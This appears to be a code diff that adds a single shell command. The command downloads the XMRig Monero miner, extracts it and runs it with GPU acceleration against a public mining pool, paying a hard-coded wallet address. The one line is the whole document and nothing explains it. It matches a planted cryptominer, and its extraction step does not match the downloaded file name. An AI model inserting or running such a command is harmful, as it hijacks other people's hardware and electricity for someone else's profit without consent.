@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig --cuda -o sg.minexmr.com:443 -u 46Vfxa6nEBaDF8MDNQexCxRDoDaKSzSgnEWf2NCda8Taae5j4kck1G9bQ5gWc4rHTRWMd3CP8oUkxTTJGHs24xoBCSU1yrE -k --tls --rig-id max
